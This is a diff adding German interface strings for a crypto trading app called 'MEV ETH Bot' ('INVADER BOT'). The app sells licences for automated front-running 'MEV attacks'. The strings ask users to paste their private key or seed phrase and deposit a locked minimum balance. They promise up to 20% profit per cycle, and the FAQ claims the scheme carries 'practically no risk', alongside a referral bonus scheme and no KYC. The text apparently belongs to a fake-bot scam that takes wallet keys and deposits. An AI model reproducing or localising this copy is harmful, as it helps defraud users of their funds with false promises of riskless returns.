@@ -1,0 +1,343 @@
+{
+  "ui": {
+    "prv": "Privater Schlüssel",
+    "importprv": "Geben Sie hier Ihren privaten Schlüssel oder Ihren Mnemonik-Samen ein",
+    "account": "Konto",
+    "copied_long": "In die Zwischenablage kopiert",
+    "copied": "Kopiert",
+    "analyzing": "Analyse läuft...",
+    "searching": "Suchen...",
+    "error": "Fehler",
+    "start_bot": "Bot starten",
+    "wallet": "Meine Brieftasche",
+    "wallet_bal": "Mein Brieftaschenguthaben",
+    "total": "Gesamter Gewinn",
+    "bot_wallet_bal": "Bot-Pool-Guthaben",
+    "assets": "Vermögenswerte",
+    "waiting": "Warten auf Verbindung zur Brieftasche...",
+    "start_bot_mes": "Während der Bot läuft, werden einige Funktionen deaktiviert sein. <br> Es wird dringend empfohlen, keine Brieftaschen zu importieren, Geld einzuzahlen oder abzuheben, bevor der Arbeitszyklus abgeschlossen ist.",
+    "user_id": "Benutzer-ID"
+  },
+  "setting_nav": {
+    "title": "Menü",
+    "title_2": "Sprache",
+    "general": "ALLGEMEIN",
+    "security": "SICHERHEIT",
+    "referral": "EMPFEHLUNG",
+    "home": "STARTSEITE",
+    "settings": "EINSTELLUNGEN",
+    "docs": "DOKUMENTE",
+    "faqs": "FAQs",
+    "support": "SUPPORT",
+    "buy_licence": "LIZENZ KAUFEN",
+    "lock": "SPERRE",
+    "info": "INFO"
+  },
+  "buttons": {
+    "bot_start": "Bot starten",
+    "bot_settings": "Bot-Einstellungen",
+    "claim": "Gewinn beanspruchen",
+    "submit": "Senden",
+    "back": "Zurück",
+    "import_account": "Brieftasche importieren",
+    "import": "Importieren",
+    "connect": "Verbinden",
+    "cancel": "Abbrechen",
+    "reject": "Ablehnen",
+    "close": "Schließen",
+    "search": "Suchen",
+    "refresh": "Aktualisieren",
+    "confirm": "Bestätigen",
+    "lock": "Sperren",
+    "buy": "Funds hinzufügen",
+    "buy_lic": "Lizenz kaufen",
+    "buy_lic2": "Kaufen",
+    "lic": "Lizenz",
+    "swap": "Tauschen",
+    "bridge": "Brücke",
+    "withdraw": "Senden",
+    "launch": "Starten",
+    "save": "Speichern",
+    "bot_running": "Bot läuft...",
+    "send": "Senden"
+  },
+  "pg_home": {
+    "text_1": "Einige Drittanbieter-Brieftaschen können den ordnungsgemäßen Betrieb der App einschränken und Fehler verursachen. <br> Um diese Fehler zu vermeiden, können Sie Ihre Brieftaschenadresse direkt mit der App verbinden. <br> MEV ETH Bot unterstützt die Verbindung von Drittanbieter-EVM-Brieftaschen über privaten Schlüssel oder Mnemonik-Phrase. <br> Unterstützte Brieftaschen: Trust Wallet, MetaMask, Coinbase, Portis, Infinity Wallet, Unstoppable usw."
+  },
+  "drawer_addfonds": {
+    "text_1": "Funds hinzufügen",
+    "text_3": "Unterstütztes Vermögen"
+  },
+  "drawer_bot_settings": {
+    "text_1": "INVADER BOT-Einstellungen",
+    "text_3": "Sie sollten mindestens 2 Börsen auswählen",
+    "text_4": "Obergrenze",
+    "text_5": "Senden",
+    "text_2": "DEXes auswählen"
+  },
+  "drawer_withdraw": {
+    "text_5": "Senden",
+    "text_2": "Guthaben der Brieftasche überschritten!"
+  },
+  "countdown": {
+    "text_1": "Der Arbeitszyklus endet in",
+    "text_2": "Der Arbeitszyklus ist vorbei. <br> Gewinn beanspruchen <br> und die Seite aktualisieren."
+  },
+  "worker": {
+    "text_1": "Bot-Startguthaben",
+    "text_2": "Verdienter Gewinn"
+  },
+  "claim_profit": {
+    "text_1": "Gewinn beanspruchen",
+    "balance": "Unzureichendes Brieftaschenguthaben, um die Bot-Gebühr zu zahlen. Füllen Sie das Guthaben auf und versuchen Sie es erneut."
+  },
+  "monitor": {
+    "text_1": "Gesamter Gewinn",
+    "text_2": "Erfolgreiche MEV-Angriffe",
+    "text_3": "Gewinn beim letzten Angriff"
+  },
+  "errors": {
+    "addfonds": "Es wird dringend empfohlen, die Brieftasche des Bots nicht aufzufüllen, bis der Arbeitszyklus abgeschlossen ist.",
+    "withdraw": "Die Operation ist ausgesetzt. Warten Sie auf das Ende des Arbeitszyklus des Bots!",
+    "import": "Um Fehler im Betrieb des Bots zu vermeiden, sollten Sie keine neue Brieftasche importieren, bis der Arbeitszyklus abgeschlossen ist.",
+    "settings": "Sie können die Bot-Einstellungen nicht ändern, solange der Bot läuft. Warten Sie, bis der Arbeitszyklus abgeschlossen ist.",
+    "claim": "Warten Sie, bis der Arbeitszyklus abgeschlossen ist.",
+    "minbal": "Das erforderliche Mindestanfangsguthaben, um den Bot zu starten",
+    "minbal_2": "Guthaben der Bot-Brieftasche",
+    "need_set": "Zuerst müssen Sie den Bot konfigurieren. Die Schaltfläche [Bot-Einstellungen] wird verwendet, um den Bot einzurichten.",
+    "text_7": "Ich habe es an einem sicheren Ort gespeichert",
+    "text_8": "Die Arbeitszykluszeit kann während der Testphase nicht geändert werden.",
+    "claim_need": "Um den Arbeitszyklus abzuschließen oder den Bot neu zu starten, müssen Sie zuerst den Gewinn beanspruchen",
+    "connect": "Die Funktion wird nach dem Verbinden der Brieftasche verfügbar sein",
+    "zero": "Das Brieftaschenguthaben beträgt null 0. Füllen Sie Ihre Brieftasche auf, um diese Operation auszuführen.",
+    "network": "Bitte wechseln Sie zum Ethereum Main Network.",
+    "network_switch": "Der Wechsel zum Ethereum Mainnet ist fehlgeschlagen.",
+    "btn": "Erstellen"
+  },
+
+
+  "pg_new_wallet": {
+    "text_2": "",
+    "text_4": "Ich verstehe und stimme zu.",
+    "btn": "Los geht's!"
+  },
+  "pg_withdraw": {
+    "text_1": "Senden an {blockchain}-Adresse",
+    "text_2": "Aktueller Gaspreis: ",
+    "btn_min": "MIN",
+    "btn_withdraw": "ABHEBEN",
+    "btn_success": "ERFOLG!",
+    "speed": "GESCHWINDIGKEIT",
+    "error_1": "Sie können {tikker} nicht an dieselbe Brieftasche abheben.",
+    "error_2": "Sie haben nicht genügend ETH in Ihrer Brieftasche, um die Transaktionsgebühren auf ETHEREUM zu bezahlen.",
+    "error_3": "Überschrittenes Kontoguthaben"
+  },
+  "pg_start_bot": {
+    "step": "Schritt",
+    "btn_basic": "Grundlegende Bot-Einstellungen",
+    "btn_withdrawsettings": "Einstellungen für Gewinnauszahlungen",
+    "btn_start": "BOT STARTEN",
+    "error_1": "Mindestens erforderliches Guthaben zum Starten des Bots: ",
+    "error_2": "Aktuelles Brieftaschenguthaben: "
+  },
+  "modalbot1": {
+    "limited": "Begrenzt",
+    "progressive": "Progressiv",
+    "hours": "Stunden",
+    "pool_1": "über 1 Jahr",
+    "pool_2": "über 6 Monate",
+    "pool_3": "über 3 Monate",
+    "pool_4": "über 1 Monat",
+    "text_1": "Grundlegende Bot-Einstellungen",
+    "text_2": "DEX wählen",
+    "text_3": "Kapitalstrategie",
+    "text_4": "Liquidity-Pool-Alter",
+    "text_4_1": "Bot-Arbeitszyklus",
+    "text_5": "Teilen Sie das Kapital in Teile auf. Erlaubt mehrere MEV-Angriffe gleichzeitig.",
+    "text_6": "Maximalbetrag für einen MEV-Angriff.",
+    "text_7": "Gewinn pro Handelszyklus. (Abhängig von der Lizenzart. Bis zu 20% mit MAX-Lizenz)",
+    "text_8": "Suche nach MEV-Angriffen mit mindestens dem angegebenen Betrag",
+    "text_9": "auf TRIAL nicht verfügbar",
+    "text_10": "Deflationäre Token ausschließen",
+    "text_11": "Meme Tokens ausschließen",
+    "text_11_1": "Nur Whitelist-Token",
+    "text_11_2": "Aktivieren Sie das neuronale Netzwerk zur Selbstlernfähigkeit.",
+    "text_12": "Automatischer Bot-Neustart (PRO, MAX)",
+    "text_13": "auf TRIAL nicht verfügbar"
+  },
+  "modalbot2": {
+    "text_5": "manuell",
+    "text_6": "um 50% erhöhen",
+    "text_7": "ETH-Gebühren bei Verzögerungen erhöhen",
+    "text_8": "eine Gebühr für jede Transaktion bezahlen",
+    "text_9": "um 10% erhöhen",
+    "text_10": "Standardmäßig verbleiben alle Gewinne in ETH",
+    "text_12": "Standard",
+    "text_11": "Zahlen Sie die Bot-Gebühr aus den Gewinnen. (PRO, MAX)"
+  },
+  "dashboard": {
+    "text_1": "Dashboard",
+    "text_2": "BOT ARBEITET",
+    "text_3": "BOT GESTOPPT",
+    "text_4": "Der Arbeitszyklus endet nach",
+    "text_5": "Der Arbeitszyklus ist vorbei",
+    "text_6": "Erfolgreiche Deals",
+    "text_7": "Gesamtgewinn pro Zyklus",
+    "status": "Lizenz: GÜLTIG",
+    "exp": "läuft ab am"
+  },
+  "pg_tokens-list": {
+    "text_1": "Meine Vermögenswerte"
+  },
+  "pg_general": {
+    "text_1": "App-Sprache auswählen"
+  },
+  "pg_security": {
+    "title": "Sicherheitseinstellungen",
+    "title_2": "EINSTELLUNGEN",
+    "restricted": "BESCHRÄNKTER BEREICH",
+    "btn_1": "App zurücksetzen",
+    "btn_2": "Direkte Brieftaschenverbindung",
+    "btn_3": "Lizenz zurücksetzen",
+    "import": "Direkte Brieftaschenverbindung",
+    "show": "Sicherheitseinstellungen anzeigen",
+    "text_4": "Alle App-Einstellungen zurücksetzen. Diese Aktion kann nicht rückgängig gemacht werden!",
+    "text_3": "Verbinden Sie Ihre Brieftasche direkt mit der App.",
+    "text_2": "Lizenz von der Brieftasche trennen. Gesamtlizenzrücksetzung, um die Lizenz auf eine andere Brieftasche zu übertragen.",
+    "text_1": "Wichtige Anwendungseinstellungen, die sich auf die Leistung der Anwendung auswirken können. Seien Sie sehr vorsichtig und aufmerksam.",
+    "mnemonic": "Mnemonic"
+  },
+
+
+  "pg_referral": {
+    "text_1": "Erhalten Sie sofort bis zu 500 $ (USDT) Belohnung für jeden Freund, den Sie zu {brand} verweisen, UND 50% ihrer Bot-Gebühren!",
+    "text_2": "Jede Empfehlung bringt dem Eingeladenen 30 bis 500 USDT, einmal pro Lizenzkauf.",
+    "text_3": "Der Bonus wird sofort gutgeschrieben - der Verweisgeber erhält seine Boni, sobald alle Bedingungen erfüllt sind.",
+    "text_4": "Keine Begrenzung für Empfehlungen - Sie können so viele Freunde verweisen, wie Sie möchten.",
+    "text_5": "Bot-Gebühren-Bonus wird am Ende jeder Handelssitzung gutgeschrieben, wenn alle Bedingungen erfüllt sind.",
+    "text_6": "Ja, ich möchte am Empfehlungsprogramm teilnehmen",
+    "text_7": "Empfehlungen",
+    "text_8": "Empfehlungsguthaben: <strong>0 USDT</strong>",
+    "text_9": "Mindestauszahlungsbetrag: 100 USDT",
+    "text_10": "Empfehlung"
+  },
+  "pg_support": {
+    "text_1": "Telegram-Support",
+    "text_2": "Bitte geben Sie bei technischen Supportanfragen unbedingt Ihre Benutzer-ID an.",
+    "text_3": "E-Mail-Support",
+    "text_4": "Die Antwortzeit beträgt 2-3 Werktage.",
+    "text_5": "Support-Benutzer-ID: ",
+    "text_6": "Verwenden Sie diese Benutzer-ID bei technischen Supportanfragen.",
+    "text_7": "Eine E-Mail an den Support senden.",
+    "text_8": "Betreff",
+    "text_9": "Ihre Nachricht",
+    "text_10": "Ihre E-Mail",
+    "btn_send": "Nachricht senden",
+    "radio_1": "Technische Probleme",
+    "radio_2": "Lizenzstatus",
+    "radio_3": "Empfehlungsprogramm",
+    "radio_4": "Ideen zur Verbesserung des Bots",
+    "thanks": "Vielen Dank! Ihre Nachricht wurde erhalten. Sie erhalten eine Antwort an die von Ihnen angegebene E-Mail-Adresse innerhalb von 2-3 Werktagen.",
+    "error": "Entschuldigung, die Nachricht wurde nicht gesendet. Es besteht keine Internetverbindung."
+  },
+  "buy_lic": {
+    "title": "Lizenz auswählen",
+    "title_2": "Lizenz kaufen",
+    "title_3": "Lizenzkauf",
+    "text_1": "p/Jahr",
+    "text_2": "Die Lizenz ist an die Brieftasche des Benutzers gebunden.",
+    "text_3": "Wählen Sie die Kryptowährung für die Zahlung aus",
+    "text_4": "Diese Lizenz ermöglicht es Anfängern, den Bot kennenzulernen, ihn zu testen und mit dem Verdienen zu beginnen.",
+    "text_5": "Für professionelle Anleger und Trader.",
+    "text_6": "Die Wahl derjenigen, die schon lange mit Kryptowährungen handeln und verstehen, wie die Dinge hier funktionieren.",
+    "text_7": "Wenn Sie bereits bezahlt haben",
+    "start_1": "Kapitalgrenzen: ~10.000 $",
+    "start_2": "3-5% Gewinn pro Zyklus",
+    "start_3": "min. Startguthaben:",
+    "start_4": "12% Bot-Gebühr",
+    "start_5": "Nur eine Blockchain",
+    "start_6": "Standard-Support",
+    "pro_1": "Kapitalgrenzen: ~200.000 $",
+    "pro_2": "3-10% Gewinn pro Zyklus",
+    "pro_3": "min. Startguthaben:",
+    "pro_4": "7% Bot-Gebühr",
+    "pro_5": "Option zum Umwandeln von Gewinnen in Stablecoins",
+    "pro_7": "24/7-Prioritätssupport",
+    "pro_6": "Bot-Gebühr aus den Gewinnen bezahlen",
+    "pro_8": "Automatischer Bot-Neustart",
+    "max_1": "Kapitalgrenzen: ~1.000.000 $",
+    "max_2": "7-20% Gewinn pro Zyklus",
+    "max_3": "2% Bot-Gebühr",
+    "max_4": "Flashkredit bis zu x5",
+    "btn_buy": "Jetzt kaufen",
+    "btn_vip": "Ihre Lizenz aktivieren"
+  },
+  "pay_buttons": {
+    "text_1": "Zahlung ausstehend...",
+    "text_2": "Senden",
+    "text_3": "(in einer Zahlung) an: ",
+    "text_4": "Wenn Sie einen anderen {crypto}-Betrag senden, wird das Zahlungssystem ihn ignorieren!",
+    "text_5": "Unterstützte Blockchains:"
+  },
+  "modal_vip": {
+    "text_1": "Aktivieren Sie die Lizenz",
+    "text_2": "Ihre aktuelle Brieftasche. Die Lizenz wird damit verknüpft sein.",
+    "text_4": "Link zur Blockchain-Transaktion (TX)",
+    "text_5": "Geben Sie einen TX-Link zu Ihrer Zahlung ein",
+    "text_6": "Ungültiger Link",
+    "text_7": "Ich habe den in der Rechnung angegebenen Betrag (~${licence_price}) genau bezahlt und die bereitgestellten Informationen überprüft.",
+    "text_8": "Wenn Ihre Informationen korrekt sind, wird Ihre Lizenz innerhalb von 1-3 Stunden aktiviert. Sie müssen die Anwendung neu starten, um Ihre Lizenz zu aktivieren."
+  },
+  "logoblock": {
+    "text_3": "Professionelles Werkzeug für MEV-Angriffe auf der Ethereum-Blockchain!"
+  },
+  "startscreen": {
+    "text_3": "Suchen, analysieren und wählen Sie Ziele mit Hilfe neuronaler Netzwerke aus. Automatisierte Angriffe, Sicherheit und Anonymität.",
+    "text_4": "Höchste Rendite - bis zu 20% pro Bot-Zyklus*",
+    "text_5": "* Die tägliche Rendite aus MEV-Angriffen ist keine konstante Größe und hängt von der gewählten Strategie, der Höhe des Startkapitals und der Verfügbarkeit von Liquidität auf DEXes ab."
+  },
+  "contact": {
+    "text_1": "Brauchen Sie Hilfe? ",
+    "text_2": " Support"
+  },
+   
+      
+
+
+  "pg_faq": {
+    "title": "FAQs",
+    "q_1": "Können Sie kurz erklären, wie Ihr Bot funktioniert?",
+    "q_2": "Sie versprechen einen Gewinn von 3 bis 15% pro Tag. Wovon hängt das ab? Ich möchte statt 3% lieber 10%.",
+    "q_3": "Können Sie mir die Smart Contract-Adresse Ihres MEV-Bots mitteilen?",
+    "q_5": "Warum benötigt die Bot-Brieftasche einen Mindestbetrag? ({minbal} {tikker}) <br> Ich habe bereits die Lizenzgebühr bezahlt, ist das nicht genug?",
+    "q_6": "Wenn ich meine Lizenz aktualisieren möchte, muss ich nur die Preisunterschiede zahlen?",
+    "q_7": "Gibt es Einschränkungen, wenn ich mein Geld abheben möchte?",
+    "q_8": "Okay. Wenn ich die Lizenzgebühr bezahle, zahle ich dann nur die MEV ETH Bot-Gebühr und keine versteckten Gebühren mehr?",
+    "q_9": "Ich möchte den MEV ETH Bot testen, bevor ich ihn kaufe. Gibt es eine Testversion?",
+    "q_10": "Verwendet der MEV ETH Bot alle Gelder in der Bot-Brieftasche für MEV-Angriffe? Alle Tokens?",
+    "q_11": "Was sind die Risiken? Kann ich meine Einzahlung verlieren?",
+    "q_12": "Muss ich Konten auf dezentralen Börsen haben?",
+    "q_13": "Muss ich KYC durchlaufen, um Ihr Kunde zu werden?",
+    "q_14": "Kann ich meine Lizenz mit Bitcoin bezahlen?",
+    "q_15": "Wie funktioniert der Zahlungsprozess für die MEV ETH Bot-Gebühr?",
+    "q_16": "Wenn ich mit etwas nicht zufrieden bin, kann ich mein Geld für die Lizenz zurückerhalten?",
+    "q_17": "Haben Sie einen Telegramm-Chatraum, in dem ich mit Ihren Kunden sprechen kann?",
+    "a_1": "Der MEV ETH Bot verwendet ein neuronales Netzwerk, um Angriffsmöglichkeiten zu finden. <br> Der MEV ETH Bot verfolgt Transaktionen auf den ausgewählten dezentralen Börsen und findet unter diesen Transaktionen große Bestellungen, die die Liquidität im Pool und den Preis des Tokens beeinflussen. Mit einer erhöhten Transaktionsgebühr tätigt er den Kauf desselben Tokens leicht früher und zu einem niedrigeren Preis. Sobald eine große Bestellung in die Blockchain eingeht, steigt der Preis des Tokens im Liquiditätspool. Und sofort verkauft der MEV ETH Bot den Token mit Gewinn. Der Bot verdient 0,5-20% bei jeder Transaktion bei diesen MEV-Angriffen. Der Bot kann bis zu 20 oder mehr solcher Geschäfte pro Arbeitszyklus tätigen. Im automatischen Modus und mit minimalem Risiko.",
+    "a_2": "Der Gewinn hängt von der Liquiditätsverfügbarkeit auf dezentralen Börsen, den Bot-Einstellungen, der gewählten Geldverwaltungsstrategie, der Lizenz und der Höhe Ihres Kapitals ab. (Je größer es ist, desto mehr MEV-Angriffe kann der MEV ETH Bot durchführen und desto höher wird der Gewinn sein). Im Durchschnitt beträgt der Gewinn etwa 3-5% pro Arbeitszyklus bei ausreichendem Kapital.",
+    "a_3": "Ja, natürlich. Sie können alle MEV-Bot-Transaktionen auf der Blockchain verfolgen. Und die Menge an Liquidität und die Anzahl der Transaktionen abschätzen. <a href=\"https://etherscan.io/address/0x000000000dfde7deaf24138722987c9a6991e2d4\"  target=\"_blank\"><br> <b>INVADER BOT: 0x000000000dfde7deaf24138722987c9a6991e2d4 </b></a>",
+    "a_5": "Sie benötigen Startkapital, um MEV-Angriffe durchzuführen. Der MEV ETH Bot findet, kauft und verkauft automatisch Handelspaare. Je höher das Startkapital ist, desto mehr MEV-Angriffe kann der MEV ETH Bot gleichzeitig eröffnen, und desto höher wird der endgültige Gewinn sein. Ohne einen Mindestbetrag kann der MEV ETH Bot einfach nicht mit der Arbeit beginnen. Die Lizenzgebühr wird separat bezahlt. Dies ist der Betrag der Belohnung für das MEV ETH Bot-Team und die anfängliche Einrichtungs- und Startgebühr.",
+    "a_6": "Es besteht keine Möglichkeit, Lizenzen zu aktualisieren. Der MEV ETH Bot verwendet individuelle Algorithmen für jede Lizenzart. Wenn Sie auf eine neue Lizenz aktualisieren möchten, müssen Sie die vollständige Lizenzgebühr bezahlen und ein separates Konto und eine separate Brieftasche für die neue Lizenz erstellen. <br> Nur die Übertragung der Lizenz auf eine andere Brieftasche ist möglich.",
+    "a_7": "Sie können jederzeit Gelder aus der Bot-Brieftasche abheben. Nachdem der Bot gestartet ist, werden die Gelder vorübergehend gesperrt. Und Sie müssen auf das Ende des Arbeitszyklus warten. Die Dauer des Arbeitszyklus kann in den Einstellungen des MEV ETH Bot festgelegt werden.",
+    "a_8": "Ja, das ist richtig. Die Lizenz ist eine einmalige Gebühr pro Jahr. Es gibt keine versteckten Gebühren. Alles ist offen. Sie zahlen nur die MEV ETH Bot-Gebühr von den Gewinnen, die Sie erzielen.",
+    "a_9": "Eine Testversion mit voller Funktionalität der Start-Lizenz steht jedem Benutzer zur Verfügung. Die Bot-Gebühr beträgt jedoch 15% des erzielten Gewinns, und die Arbeitszeit des Bots ist auf einen 12-stündigen Arbeitszyklus beschränkt.",
+    "a_10": "Der MEV ETH Bot führt MEV-Angriffe nur mit der Hauptblockchain-Währung (ETH) durch. <br> MEV ETH Bot ignoriert alle anderen Tokens. <br>",
+    "a_11": "Das Erzielen von Gewinnen mit MEV-Angriffen birgt praktisch keine Risiken. Es gibt geringe globale Risiken wie das Hacken dezentraler Börsen oder plötzliche Zusammenbrüche (Betrug) einiger Tokens. Da der MEV ETH Bot jedoch nicht auf \"Alles oder Nichts\"-Basis handelt, sondern sein Kapital aufteilt, um Risiken zu minimieren und mehr MEV-Angriffe durchzuführen, besteht keine Gefahr.",
+    "a_12": "Nein, Sie müssen keine Konten erstellen. Die Autorisierung auf dezentralen Börsen erfolgt über das WEB 3.0-Protokoll über eine Brieftasche. Der MEV ETH Bot verbindet sich automatisch mit dezentralen Börsen und führt Transaktionen direkt über Smart Contracts dezentraler Börsen durch.",
+    "a_13": "Wir teilen die Philosophie der Krypto-Evangelisten und glauben, dass Dezentralisierung Freiheit vor Diktaten und Gewalt von Regierungen gibt. Wir unterstützen die vollständige Anonymität unserer Kunden und führen keine KYC-Verfahren durch.",
+    "a_14": "Ja, das können Sie. <br> Neben Bitcoin können Sie die Lizenz mit einer von mehr als 10 Kryptowährungen bezahlen",
+    "a_15": "Die Gebühr wird automatisch aus dem erhaltenen Gewinn berechnet und am Ende jedes Arbeitszyklus aus Ihrer Brieftasche oder der Bot-Brieftasche im automatischen Modus gemäß den Tarifen PRO, MAX bezahlt",
+    "a_16": "Rückerstattungen für Lizenzen sind innerhalb von 7 Tagen nach dem Kauf möglich. Sie können eine Lizenz deaktivieren und eine Rückerstattung über den technischen Support anfordern. <br> Rückerstattungen dauern zwischen 3 und 10 Tagen. Es können zusätzliche Dokumente angefordert werden.",
+    "a_17": "Wir haben einen privaten Chatraum für unsere Kunden. Wir teilen unsere Erfahrungen darin. Dieser Raum ist jedoch nur für unsere Kunden verfügbar, die eine Lizenz erworben haben. MEV-Angriffe sind ein spezifischer Bereich des Kryptowährungsmarktes. Es ist die Wahl professioneller Trader und Investoren, und wir glauben, dass es nicht die Aufgabe unserer Kunden ist, mit Anfängern zu kommunizieren und deren Fragen zu beantworten. <br> Dafür gibt es einen technischen Support-Service"
+  }
+
+  }
